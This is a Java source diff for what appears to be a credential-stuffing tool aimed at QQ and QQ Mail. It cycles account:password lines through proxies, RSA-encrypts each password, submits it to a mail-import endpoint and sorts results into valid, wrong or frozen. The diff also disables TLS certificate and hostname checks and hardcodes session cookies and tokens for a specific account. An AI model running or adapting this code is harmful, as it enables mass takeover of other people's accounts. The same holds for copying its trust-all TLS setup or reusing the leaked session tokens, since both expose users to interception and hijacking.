@@ -8,27 +8,46 @@ package ws.hoyland.sm;
 //import java.security.spec.RSAPublicKeySpec;
 //import java.util.Observable;
 //import java.util.Observer;
-import java.io.InputStream;
-import java.net.HttpURLConnection;
-import java.net.URL;
-import java.security.MessageDigest;
+import java.math.BigInteger;
+//import java.net.URLEncoder;
+import java.security.KeyFactory;
+import java.security.PublicKey;
+import java.security.cert.CertificateException;
+import java.security.spec.RSAPublicKeySpec;
+
+import javax.crypto.Cipher;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.TrustManager;
+import javax.net.ssl.X509TrustManager;
 
 //import javax.crypto.Cipher;
 
+//import org.apache.commons.codec.binary.Base64;
 import org.apache.http.HttpEntity;
 import org.apache.http.HttpHost;
 import org.apache.http.HttpResponse;
+import org.apache.http.client.CookieStore;
 import org.apache.http.client.methods.HttpGet;
-//import org.apache.http.client.methods.HttpPost;
+import org.apache.http.client.methods.HttpPost;
+import org.apache.http.client.params.CookiePolicy;
+import org.apache.http.client.params.HttpClientParams;
+import org.apache.http.conn.ClientConnectionManager;
 import org.apache.http.conn.params.ConnRouteParams;
+import org.apache.http.conn.scheme.Scheme;
+import org.apache.http.conn.scheme.SchemeRegistry;
+import org.apache.http.conn.ssl.SSLSocketFactory;
+//import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.StringEntity;
 //import org.apache.http.entity.StringEntity;
 import org.apache.http.impl.client.DefaultHttpClient;
+import org.apache.http.impl.cookie.BasicClientCookie;
 import org.apache.http.params.CoreConnectionPNames;
 import org.apache.http.util.EntityUtils;
+import org.json.JSONObject;
 
 //import ws.hoyland.security.ClientDetecter;
 import ws.hoyland.util.Configuration;
-import ws.hoyland.util.Util;
+import ws.hoyland.util.Converts;
 //import ws.hoyland.util.Crypter;
 //import ws.hoyland.util.EngineMessage;
 //import ws.hoyland.util.EngineMessageType;
@@ -50,50 +69,74 @@ public class Task implements Runnable {//, Observer {
 	// private static String UAG =
 	// "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 734; Maxthon; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)";
 	// "Opera/9.25 (Windows NT 6.0; U; en)";
-//	private static String UAG = "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; sdk Build/GRI34) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
+	private static String UAG = "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; sdk Build/GRI34) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1";
 //	private static Random RND = new Random();
 //	private static String expBytes = "010001";
 //	private static String modBytes = "C39A51FB1202F75F0E20F691C8E370BCFA7CD2B75FD588CADAC549ADF1F03CFDAACCB9FBA5D7219CA4A3E40F9324121474BE85355CF178E0D3BD0719EDF859D60D24874B105FAC73EF067DEE962F5D12C7DB983039BA5EE0183479923174886A2C45ACFD5441C1B2FCC2083952016C66631884527585FF446BBC4F75606EF87B";
+	
+	private static String expBytes = "10001";
+	private static String modBytes = "CF87D7B4C864F4842F1D337491A48FFF54B73A17300E8E42FA365420393AC0346AE55D8AFAD975DFA175FAF0106CBA81AF1DDE4ACEC284DAC6ED9A0D8FEB1CC070733C58213EFFED46529C54CEA06D774E3CC7E073346AEBD6C66FC973F299EB74738E400B22B1E7CDC54E71AED059D228DFEB5B29C530FF341502AE56DDCFE9";
 
+	
 	private static Configuration CONFIGURATION = Configuration
 			.getInstance("config.ini");
-	private static String VERSION = "10074";
 	
-	static{
-		HttpURLConnection connection = null;
-		InputStream input = null;
-		try{
-			URL url = new URL("http://ui.ptlogin2.qq.com/ptui_ver.js?v="+Math.random());
-			connection = (HttpURLConnection) url
-					.openConnection();
-			connection.setDoOutput(true);
-			connection.setRequestMethod("GET");
-			
-			input = connection.getInputStream();
-			byte[] bs = new byte[input.available()];
-			input.read(bs);
-			String resp = new String(bs);
-			VERSION = resp.substring(resp.indexOf("ptuiV(\"")+7, resp.indexOf("\");"));
-			System.err.println("version:"+VERSION);
-		}catch(Exception e){
-			e.printStackTrace();
-		}finally{
-			if(input!=null){
-				try{
-					input.close();
-				}catch(Exception e){
-					e.printStackTrace();
-				}
-			}
-			if(connection!=null){
-				try{
-					connection.disconnect();
-				}catch(Exception e){
-					e.printStackTrace();
-				}
-			}
-		}		
-	}
+	private static TrustManager tm = new X509TrustManager() {
+
+		public void checkClientTrusted(
+				java.security.cert.X509Certificate[] arg0, String arg1)
+				throws CertificateException {
+
+		}
+
+		public void checkServerTrusted(
+				java.security.cert.X509Certificate[] arg0, String arg1)
+				throws CertificateException {
+
+		}
+
+		public java.security.cert.X509Certificate[] getAcceptedIssuers() {
+			return null;
+		}
+	};
+	
+//	private static String VERSION = "10074";
+	
+//	static{
+//		HttpURLConnection connection = null;
+//		InputStream input = null;
+//		try{
+//			URL url = new URL("http://ui.ptlogin2.qq.com/ptui_ver.js?v="+Math.random());
+//			connection = (HttpURLConnection) url
+//					.openConnection();
+//			connection.setDoOutput(true);
+//			connection.setRequestMethod("GET");
+//			
+//			input = connection.getInputStream();
+//			byte[] bs = new byte[input.available()];
+//			input.read(bs);
+//			String resp = new String(bs);
+//			VERSION = resp.substring(resp.indexOf("ptuiV(\"")+7, resp.indexOf("\");"));
+//			System.err.println("version:"+VERSION);
+//		}catch(Exception e){
+//			e.printStackTrace();
+//		}finally{
+//			if(input!=null){
+//				try{
+//					input.close();
+//				}catch(Exception e){
+//					e.printStackTrace();
+//				}
+//			}
+//			if(connection!=null){
+//				try{
+//					connection.disconnect();
+//				}catch(Exception e){
+//					e.printStackTrace();
+//				}
+//			}
+//		}		
+//	}
 
 	public Task(String line) {
 		this.line = line;
@@ -182,6 +225,18 @@ public class Task implements Runnable {//, Observer {
 					1000 * Integer.parseInt(CONFIGURATION
 							.getProperty("TIMEOUT")));
 			
+			HttpClientParams.setCookiePolicy(client.getParams(), CookiePolicy.BROWSER_COMPATIBILITY);
+			
+			try {
+				SSLContext sslcontext = SSLContext.getInstance("SSL");
+				sslcontext.init(null, new TrustManager[]{tm}, null);
+		        SSLSocketFactory ssf = new    SSLSocketFactory(sslcontext, SSLSocketFactory.ALLOW_ALL_HOSTNAME_VERIFIER);
+		        ClientConnectionManager ccm = client.getConnectionManager();
+		        SchemeRegistry sr = ccm.getSchemeRegistry();
+		        sr.register(new Scheme("https", 443, ssf));
+			} catch (Exception e) {
+				e.printStackTrace();
+			}
 			//client.getConnectionManager().closeIdleConnections(4000, TimeUnit.MILLISECONDS);
 			
 			/**
@@ -298,40 +353,9 @@ public class Task implements Runnable {//, Observer {
 			}
 			**/
 			boolean getit = true;
-			String loginSig = null;
+			String sid = null;
 			if(getit){
-				
-				request = new HttpGet("http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");
 
-//				request.setHeader("User-Agent", UAG);
-//				request.setHeader("Content-Type", "text/html");
-//				request.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
-//				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
-//				request.setHeader("Accept-Encoding", "gzip, deflate");
-//				request.setHeader("Referer", "http://id.qq.com/login/ptlogin.html");
-//				request.setHeader("Connection", "keep-alive");				
-
-				response = client.execute(request);
-				entity = response.getEntity();
-
-				resp = EntityUtils.toString(entity);
-				
-				try {
-					if (entity != null) {
-						EntityUtils.consume(entity);
-					}
-				} catch (Exception e) {
-					e.printStackTrace();
-				}
-				if (request != null) {
-					request.releaseConnection();
-					request.abort();
-				}
-
-				//",clienti
-				loginSig = resp.substring(resp.indexOf(",login_sig:\"")+12, resp.indexOf("\",clientip"));
-				System.err.println(loginSig);
-				
 				
 				String px = Engine.getInstance().getProxy();
 				// if(px==null){
@@ -348,23 +372,41 @@ public class Task implements Runnable {//, Observer {
 				client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY,
 						proxy);
 				
-				request = new HttpGet("http://check.ptlogin2.qq.com/check?regmaster=&uin="+account+"&appid=1006102&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&u1=http%3A%2F%2Fid.qq.com%2Findex.html&r="+Math.random());
+				request = new HttpGet("https://mail.qq.com/cgi-bin/login?vt=passport&vm=wsk&delegate_url=");
 
-//				request.setHeader("User-Agent", UAG);
-//				//request.setHeader("Content-Type", "text/html");
-//				request.setHeader("Accept", "*/*");
-//				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
-//				request.setHeader("Accept-Encoding", "gzip, deflate");
-//				request.setHeader("Referer", "http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");
-//				request.setHeader("Connection", "keep-alive");				
+				request.setHeader("User-Agent", UAG);
+				request.setHeader("Content-Type", "text/html");
+				request.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
+				request.setHeader("Accept-Encoding", "gzip, deflate");
+				request.setHeader("Referer", "https://mail.qq.com/cgi-bin/loginpage");
+				request.setHeader("Connection", "keep-alive");				
 
-				
-				Engine.getInstance().info(
-						account + " -> " + proxy.getHostName() + ":"
-								+ proxy.getPort());
+				CookieStore  cs = client.getCookieStore();
+				//
+				//String[] cks = "pt2gguin=o1696195841; uin=o1696195841; skey=@AIhN7K0s4; ETK=; superuin=o1696195841; superkey=2O4VH82tu3wNKKLh3zs*YTERLw159XoZz9nFgLz9rLw_; supertoken=1512671834; ptisp=ctc; RK=TeXO02CBe3; ptuserinfo=e4b880e4ba8ce4b889; ptcz=8b10fd2ce893905d7dedff0af7452fc0040c9de336dede894c396a3c98c7e678; ptcz=; airkey=; ptwebqq=6a8cce7c33974d34778f4a199b4db563dbc894f0d40807f36154c6091934ee14;".split(" ");
+				String[] cks = "pgv_info=ssid=s805283833; pgv_pvid=2966307264; ptisp=ctc; verifysession=h02rC7b2e0FO_foDcblp7_lm-JykS7oNpyvT_6T3CGaplc8BKGkAywTzJFH9iw870VRcDLYJRRMIG_A-CKULdyfHQ**; pt2gguin=o0068159276; uin=o0068159276; skey=@2TrMcpyaM; ptcz=75e4e055325d5f66f0ac1e63182b9e3847d3d3c188954d84a06f27157551e3be; p_uin=o0068159276; p_skey=otGoXg-ef**EA7kYziKCRaT1iPPBvUJ-oEPJWQ0h9rw_; pt4_token=zn66YCwi7VyLqdFIEBj1rw__; wimrefreshrun=0&; qm_flag=0; qqmail_alias=68159276@qq.com; sid=68159276&468a23dfb223657ef3ec2deb082b7e6c,qb3RHb1hnLWVmKipFQTdrWXppS0NSYVQxaVBQQnZVSi1vRVBKV1EwaDlyd18.; qm_username=68159276; new_mail_num=68159276&0; qm_sid=468a23dfb223657ef3ec2deb082b7e6c,qb3RHb1hnLWVmKipFQTdrWXppS0NSYVQxaVBQQnZVSi1vRVBKV1EwaDlyd18.; qm_domain=http://mail.qq.com; qm_ptsk=68159276&@2TrMcpyaM; CCSHOW=000031; foxacc=68159276&0; ssl_edition=mail.qq.com; edition=mail.qq.com; username=68159276&68159276; reader_mail_cur_page=stattime%3D1397794144385".split(" ");
+				for(int i=0;i<cks.length;i++){
+					String[] lsx = cks[i].substring(0, cks[i].length()-1).split("=");
+					//System.out.println(cks[i]+"/"+ls.length);
+					BasicClientCookie cookie = null;
+					if(lsx.length==1){
+						cookie = new BasicClientCookie(lsx[0], "");
+					}else{
+						//System.err.println(lsx[0]+"="+lsx[1]);
+//						System.err.println(lsx[1]);
+						cookie = new BasicClientCookie(lsx[0], lsx[1]);
+					}
+					cookie.setDomain("mail.qq.com");
+					cookie.setPath("/");
+					
+					cs.addCookie(cookie);
+				}
+				client.setCookieStore(cs);
 				
 				response = client.execute(request);
 				entity = response.getEntity();
+
 				resp = EntityUtils.toString(entity);
 				
 				try {
@@ -378,100 +420,205 @@ public class Task implements Runnable {//, Observer {
 					request.releaseConnection();
 					request.abort();
 				}
-				
-				boolean nvc = false;
-				//nvc = (resp.charAt(14)=='1')?true:false;
-				//System.out.println("A:"+resp);
-				if(!resp.startsWith("ptui_checkVC")){
-					throw new Exception("Invalid Proxy server");
-				}
 
-				nvc = (resp.charAt(14)=='1')?true:false;
 				
-				//没有做RSAKEY检查，默认是应该有KEY，用getEncryption；否则用getRSAEncryption
-				//System.out.println("B:"+resp);
-				if(nvc){//验证码
-					System.out.println(">>>>>>>>>>>>>>>>");
+				//frame_html?sid=
+				//",clienti
+				sid = resp.substring(resp.indexOf("frame_html?sid=")+15, resp.indexOf("frame_html?sid=")+31);
+				System.err.println("sid="+sid);
+
+				String r = resp.substring(resp.indexOf("targetUrl+=\"&r=")+15, resp.indexOf("targetUrl+=\"&r=")+47);
+				System.err.println("r="+r);
+				/**
+				
+				String px = Engine.getInstance().getProxy();
+				// if(px==null){
+				// throw new NoProxyException("No Proxy!");
+				// }
+				if (!Engine.getInstance().canRun()) {
 					return;
 				}
-				System.out.println("nvc:"+resp.charAt(14));
-				System.out.println("============");
-				//System.out.println(resp);
-				int fidx = resp.indexOf(",");
-				int lidx = resp.lastIndexOf(",");
 				
-				String vcode = resp.substring(fidx+2, lidx-1);
-				System.err.println("vcode="+vcode);
-				String salt = resp.substring(lidx+2, lidx+34);
-				System.err.println("salt="+salt);
-				
+				String[] ms = px.split(":");
+				proxy = new HttpHost(ms[0], Integer.parseInt(ms[1]));
 
-				//计算ECP
-				MessageDigest md = MessageDigest.getInstance("MD5"); 
-				byte[] results = md.digest(password.getBytes());
 				
-				int psz = results.length;
-				byte[] rs = new byte[psz+8];
-				for(int i=0;i<psz;i++){
-					rs[i] = results[i];
-				}
-				
-				String[] salts = salt.substring(2).split("\\\\x");
-				//System.out.println(salts.length);
-				for(int i=0; i<salts.length; i++){
-					rs[psz+i] = (byte)Integer.parseInt(salts[i], 16);
-				}
-				
-				results = md.digest(rs); 
-				String resultString = Util.byteArrayToHexString(results).toUpperCase();
-				
-				//vcode = "!RQM";
-				results = md.digest((resultString+vcode.toUpperCase()).getBytes()); 				
-				resultString = Util.byteArrayToHexString(results).toUpperCase();
-				//System.out.println(resultString);
-				String ecp = resultString;
-				
-				
-				//System.out.println("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");
-				request = new HttpGet("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");
+				client.getParams().setParameter(ConnRouteParams.DEFAULT_PROXY,
+						proxy);
+				**/
+				Engine.getInstance().info(account + " -> " + "r="+r);
+				HttpPost post = new HttpPost("http://mail.qq.com/cgi-bin/laddr_clone?sid="+sid);
 
-//				request.setHeader("User-Agent", UAG);
-//				//request.setHeader("Content-Type", "text/html");
-//				request.setHeader("Accept", "*/*");
-//				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
-//				request.setHeader("Accept-Encoding", "gzip, deflate");
-//				request.setHeader("Referer", "http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");
-//				request.setHeader("Connection", "keep-alive");				
-				request.setHeader("Cookie", "ptui_loginuin="+account);
+				post.setHeader("User-Agent", UAG);
+				post.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+				post.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+				post.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
+				post.setHeader("Accept-Encoding", "gzip, deflate");
+				post.setHeader("Referer", "http://mail.qq.com/cgi-bin/frame_html?sid="+sid+"&r="+r);
+				post.setHeader("Connection", "keep-alive");				
+				post.setHeader("Pragma", "no-cache");
+				post.setHeader("Cache-Control", "no-cache");
 				
-				// try{
-				// Thread.sleep(200);
-				// }catch(Exception e){
-				// return;
-				// }
-	
-				// if(!run){
-//				if (!Engine.getInstance().canRun()) {
-//					return;
-//				}
 				
-				response = client.execute(request);
+				KeyFactory factory = KeyFactory.getInstance("RSA");
+				Cipher cipher = Cipher.getInstance("RSA");
+				BigInteger modules = new BigInteger(modBytes, 16);
+				BigInteger exponent = new BigInteger(expBytes, 16);
+
+				RSAPublicKeySpec pubSpec = new RSAPublicKeySpec(modules,
+						exponent);
+				PublicKey pubKey = factory.generatePublic(pubSpec);
+				cipher.init(Cipher.ENCRYPT_MODE, pubKey);
+				byte[] encrypted = cipher.doFinal((password+ "\n" + (System.currentTimeMillis() / 1000) + "\n").getBytes());
+//				byte[] encrypted = cipher.doFinal(("1234"+ "\n" + "1397805395" + "\n").getBytes());
+//				System.err.println(password);
+//				System.err.println(System.currentTimeMillis() / 1000);
+//				System.err.println(Converts.bytesToHexString(encrypted).toLowerCase());
+				//encrypted = Converts.hexStringToByte("1e395b2f6e5eb556c0d08c64f73be3ad7a08826fd2d0d55d839196ae142d0cb6b610d4fc4b5769d283a868f5f78a1068ee2946a753bc5462d6d41342dea265121c6d2e7d2f19bc9b688d2301a185da7855e19271a9d903da4deb275d4ed3e5f48c626b18eab7eb19d6ae7b3377663a2896b7c901fb41022dbc011d5076f8af1c");
+				
+				
+				//Base64 base64 = new Base64();
+				//String epwd = (new String(base64.encode(encrypted)));
+				String epwd = Converts.hexStringToB64(Converts.bytesToHexString(encrypted).toLowerCase());
+				//System.err.println("old="+Converts.bytesToHexString(encrypted).toLowerCase());
+				//System.err.println("epwd="+epwd);
+				//YxGWKkCgFRSbFir0dEc55Uu2JyjnrobI4%2BtzJcMMQNTMcbDP5knm2IPo2VX84rKs%2BhC%2BYdhZi/HCJwkh53n2oufwve0V610p19x2RFmTpmzRW8G3ryAvcS5gOvLBm5yRdANFG8HINWVOjtemjLqGf0mnGOp1U8OTOPktTKlCnBs
+				StringEntity se = new StringEntity("sid="+sid+"&grpname="+account+"@qq.com&fun=clone&Email="+account+"@qq.com&Pwd="+epwd.replaceAll("\\+", "%2B")+"&t=addr_clone.json&ef=js&version=2");
+				post.setEntity(se);
+				
+//				Engine.getInstance().info(
+//						account + " -> " + proxy.getHostName() + ":"
+//								+ proxy.getPort());
+				
+				response = client.execute(post);
 				entity = response.getEntity();
 				resp = EntityUtils.toString(entity);
-	
-				//if(resp.startsWith("ptuiCB('4'")){ //验证码错误
-				if(resp.startsWith("ptuiCB('0'")){ //成功登录
+				
+				if(resp.startsWith("(")){
+					resp = resp.substring(1, resp.length()-1);
+				}
+				if(resp.indexOf("errcode : 0")!=-1){//正确
 					Engine.getInstance().log(0, id, account + "----" + password);
-				}else if(resp.startsWith("ptuiCB('3'")){ //您输入的帐号或密码不正确，请重新输入
-					Engine.getInstance().log(1, id,  account + "----" + password);
-				}else if(resp.startsWith("ptuiCB('19'")){ //帐号冻结，提示暂时无法登录
-					Engine.getInstance().log(2, id,  account + "----" + password);
-				}else{
-					// ptuiCB('19' 暂停使用
-					// ptuiCB('7' 网络连接异常
-					Engine.getInstance().addTask(line);
+				}else{				
+					JSONObject json = new JSONObject(resp);					
+					if("-102".equals(json.getString("errcode"))){//错误
+						Engine.getInstance().log(1, id,  account + "----" + password);
+					}else if("-109".equals(json.getString("errcode"))){ //服务器太忙
+						Engine.getInstance().addTask(line);
+					}else if("-125".equals(json.getString("errcode"))){ //不存在的邮箱地址
+						//Engine.getInstance().addTask(line);
+					}else{
+						Engine.getInstance().addTask(line);
+					}
 				}
 				
+				try {
+					if (entity != null) {
+						EntityUtils.consume(entity);
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+				if (post != null) {
+					post.releaseConnection();
+					post.abort();
+				}
+				
+				///////////////////////////
+				
+//				boolean nvc = false;
+//				//nvc = (resp.charAt(14)=='1')?true:false;
+//				//System.out.println("A:"+resp);
+//				if(!resp.startsWith("ptui_checkVC")){
+//					throw new Exception("Invalid Proxy server");
+//				}
+//
+//				nvc = (resp.charAt(14)=='1')?true:false;
+//				
+//				//没有做RSAKEY检查，默认是应该有KEY，用getEncryption；否则用getRSAEncryption
+//				//System.out.println("B:"+resp);
+//				if(nvc){//验证码
+//					System.out.println(">>>>>>>>>>>>>>>>");
+//					return;
+//				}
+//				System.out.println("nvc:"+resp.charAt(14));
+//				System.out.println("============");
+//				//System.out.println(resp);
+//				int fidx = resp.indexOf(",");
+//				int lidx = resp.lastIndexOf(",");
+//				
+//				String vcode = resp.substring(fidx+2, lidx-1);
+//				System.err.println("vcode="+vcode);
+//				String salt = resp.substring(lidx+2, lidx+34);
+//				System.err.println("salt="+salt);
+//				
+//
+//				//计算ECP
+//				MessageDigest md = MessageDigest.getInstance("MD5"); 
+//				byte[] results = md.digest(password.getBytes());
+//				
+//				int psz = results.length;
+//				byte[] rs = new byte[psz+8];
+//				for(int i=0;i<psz;i++){
+//					rs[i] = results[i];
+//				}
+//				
+//				String[] salts = salt.substring(2).split("\\\\x");
+//				//System.out.println(salts.length);
+//				for(int i=0; i<salts.length; i++){
+//					rs[psz+i] = (byte)Integer.parseInt(salts[i], 16);
+//				}
+//				
+//				results = md.digest(rs); 
+//				String resultString = Util.byteArrayToHexString(results).toUpperCase();
+//				
+//				//vcode = "!RQM";
+//				results = md.digest((resultString+vcode.toUpperCase()).getBytes()); 				
+//				resultString = Util.byteArrayToHexString(results).toUpperCase();
+//				//System.out.println(resultString);
+//				String ecp = resultString;
+//				
+//				
+//				//System.out.println("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");
+//				request = new HttpGet("http://ptlogin2.qq.com/login?u="+account+"&p="+ecp+"&verifycode="+vcode+"&aid=1006102&u1=http%3A%2F%2Fid.qq.com%2Findex.html&h=1&ptredirect=1&ptlang=2052&daid=1&from_ui=1&dumy=&low_login_enable=0&regmaster=&fp=loginerroralert&action=4-9-"+System.currentTimeMillis()+"&mibao_css=&t=1&g=1&js_ver="+VERSION+"&js_type=1&login_sig="+loginSig+"&pt_rsa=0");
+//
+////				request.setHeader("User-Agent", UAG);
+////				//request.setHeader("Content-Type", "text/html");
+////				request.setHeader("Accept", "*/*");
+////				request.setHeader("Accept-Language", "zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3");
+////				request.setHeader("Accept-Encoding", "gzip, deflate");
+////				request.setHeader("Referer", "http://ui.ptlogin2.qq.com/cgi-bin/login?appid=1006102&daid=1&style=13&s_url=http://id.qq.com/index.html");
+////				request.setHeader("Connection", "keep-alive");				
+//				request.setHeader("Cookie", "ptui_loginuin="+account);
+//				
+//				// try{
+//				// Thread.sleep(200);
+//				// }catch(Exception e){
+//				// return;
+//				// }
+//	
+//				// if(!run){
+////				if (!Engine.getInstance().canRun()) {
+////					return;
+////				}
+//				
+//				response = client.execute(request);
+//				entity = response.getEntity();
+//				resp = EntityUtils.toString(entity);
+//	
+//				//if(resp.startsWith("ptuiCB('4'")){ //验证码错误
+//				if(resp.startsWith("ptuiCB('0'")){ //成功登录
+//					Engine.getInstance().log(0, id, account + "----" + password);
+//				}else if(resp.startsWith("ptuiCB('3'")){ //您输入的帐号或密码不正确，请重新输入
+//					Engine.getInstance().log(1, id,  account + "----" + password);
+//				}else if(resp.startsWith("ptuiCB('19'")){ //帐号冻结，提示暂时无法登录
+//					Engine.getInstance().log(2, id,  account + "----" + password);
+//				}else{
+//					// ptuiCB('19' 暂停使用
+//					// ptuiCB('7' 网络连接异常
+//					Engine.getInstance().addTask(line);
+//				}
+//				
 				/**
 				 * Class<?> clazz = null; clazz = new
 				 * HoylandClassLoader().loadClass("ws.hoyland.sm.Dynamicer",
